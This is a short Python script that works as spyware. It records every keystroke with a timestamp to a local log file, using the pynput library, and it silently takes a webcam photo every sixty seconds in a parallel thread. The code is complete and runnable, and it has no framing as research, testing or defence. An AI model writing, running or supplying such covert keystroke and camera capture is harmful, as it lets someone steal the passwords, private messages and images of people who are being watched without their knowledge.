from pynput import keyboard
import cv2
import datetime
import threading
import time

def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(f"{datetime.datetime.now()}: {key.char}\n")
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(f"{datetime.datetime.now()}: {key}\n")

def capture_image():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite(f"captured_image_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png", frame)
    cap.release()

def keylogger_thread():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def camera_thread():
    while True:
        capture_image()
        time.sleep(60)  # Capture an image every 60 seconds

if __name__ == "__main__":
    keylogger = threading.Thread(target=keylogger_thread)
    camera = threading.Thread(target=camera_thread)

    keylogger.start()
    camera.start()

    keylogger.join()
    camera.join()